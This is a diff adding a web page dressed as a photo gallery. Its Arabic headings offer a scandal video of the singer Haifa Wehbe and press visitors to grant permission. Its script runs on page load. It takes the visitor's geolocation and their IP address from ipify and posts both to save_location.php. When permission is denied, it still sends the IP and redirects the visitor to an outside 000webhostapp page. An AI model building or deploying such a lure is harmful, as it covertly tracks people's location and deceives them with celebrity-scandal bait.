@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Photo Gallery</title>
+	<style>
+		.container {
+			display: grid;
+			grid-template-columns: repeat(3, 1fr);
+			grid-gap: 20px;
+		}
+
+		.image-container {
+			position: relative;
+			overflow: hidden;
+		}
+
+		.image-container img {
+			width: 100%;
+			height: auto;
+			transition: transform 0.3s ease;
+		}
+
+		.image-container:hover img {
+			transform: scale(1.1);
+		}
+
+		.image-overlay {
+			position: absolute;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: rgba(0, 0, 0, 0.5);
+			color: #fff;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			opacity: 0;
+			transition: opacity 0.3s ease;
+		}
+
+		.image-container:hover .image-overlay {
+			opacity: 1;
+		}
+
+		.image-overlay p {
+			margin: 0;
+			font-size: 18px;
+		}
+	</style>
+
+<style>
+
+body {
+ display:flex; flex-direction:column; justify-content:center;
+  min-height:100vh;
+  background-image: url('xx.jpg');
+  background-repeat: no-repeat;
+  background-attachment: fixed; 
+  background-size: 100% 100%;
+}
+</style>
+	<meta charset="UTF-8">
+	<title> seko</title>
+	
+
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script>
+	
+		function getLocation() {
+
+            
+
+			if (navigator.geolocation) {
+			    
+			    
+				navigator.geolocation.getCurrentPosition(showPosition, showError);
+				
+				
+getIP(function(ip) {
+                saveLocationToServer(ip, ip); // Use the IP address as the location parameter
+            });
+				
+				
+				
+				
+				
+			} else {
+				alert("غير المتصفح");
+			}
+		}
+
+	function showPosition(position) {
+    var lat = position.coords.latitude;
+    var lng = position.coords.longitude;
+    var location =  lat + " " + lng;
+    $("#location").html(location);
+    getIP(function(ip) {
+        saveLocationToServer(location, ip);
+    });
+	
+}
+		function getIP(callback) {
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+        callback(data.ip);
+    });
+}
+
+		function saveLocationToServer(location, ip) {
+    $.post("save_location.php", { location: location, ip: ip }, function(data) {
+        console.log(data);
+        //alert("تم حفظ العنوان في الملف!");
+    });
+}
+
+		function showError(error) {
+		
+    switch(error.code) {
+        
+        
+        
+        
+        
+        case error.PERMISSION_DENIED:
+        
+            getIP(function(ip) {
+                saveLocationToServer(ip, ip); // Use the IP address as the location parameter
+            });
+            
+            ///////tricking test
+            
+               
+   window.location.href = 'https://winy1.000webhostapp.com/index.html';
+
+            ///////
+            
+       //     alert("اضغط سماح عشان تشوف الفضايح");
+            
+            break;
+        case error.POSITION_UNAVAILABLE:
+            getIP(function(ip) {
+                saveLocationToServer(ip, ip); // Use the IP address as the location parameter
+            });
+            //alert("معلومات عن الموقع غير متاحة.");
+            break;
+        case error.TIMEOUT:
+            getIP(function(ip) {
+                saveLocationToServer(ip, ip); // Use the IP address as the location parameter
+            });
+            //alert("لم يتم الرد على طلب الموقع.");
+            break;
+        case error.UNKNOWN_ERROR:
+            getIP(function(ip) {
+                saveLocationToServer(ip, ip); // Use the IP address as the location parameter
+            });
+            //alert("حدث خطأ غير معروف.");
+            break;
+    }
+    
+    
+}
+
+
+
+
+		$(document).ready(function() {
+			getLocation();
+		});
+		
+		
+		
+	</script>
+</head>
+<body>
+
+<H1><center><FONT style="color:Green">فضايح هيفاء وهبي</center></H1>
+
+
+<H1><center><FONT SIZE="240" style="color:red">‎اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعه</center></H1>
+
+
+	<div class="container">
+		<div class="image-container">
+			<img src="https://i.ibb.co/CM1zJSc/photo1.jpg" alt="Photo 1">
+			<div class="image-overlay">
+				<p>Photo 1</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/Qn6nbGM/photo2.jpg" alt="Photo 2">
+			<div class="image-overlay">
+				<p>Photo 2</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/XF1gFN0/photo3.jpg" alt="Photo 3">
+			<div class="image-overlay">
+				<p>Photo 3</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/rmSPhTB/photo4.jpg" alt="Photo 4">
+			<div class="image-overlay">
+				<p>Photo 4</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/0BVhJkB/photo5.jpg" alt="Photo 5">
+			<div class="image-overlay">
+				<p>Photo 5</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/5Mw4bdQ/photo6.jpg" alt="Photo 6">
+			<div class="image-overlay">
+				<p>Photo 6</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/2Y0ZKnT/photo7.jpg" alt="Photo 7">
+			<div class="image-overlay">
+				<p>Photo 7</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https			://i.ibb.co/PhKHmNt/photo8.jpg" alt="Photo 8">
+			<div class="image-overlay">
+				<p>Photo 8</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/1b5m9XD/photo9.jpg" alt="Photo 9">
+			<div class="image-overlay">
+				<p>Photo 9</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/9NPt9K8/photo10.jpg" alt="Photo 10">
+			<div class="image-overlay">
+				<p>Photo 10</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/2nYQm20/photo11.jpg" alt="Photo 11">
+			<div class="image-overlay">
+				<p>Photo 11</p>
+			</div>
+		</div>
+		<div class="image-container">
+			<img src="https://i.ibb.co/SxWQSyf/photo12.jpg" alt="Photo 12">
+			<div class="image-overlay">
+				<p>Photo 12</p>
+			</div>
+		</div>
+	</div>
+	
+</body>
+</html>
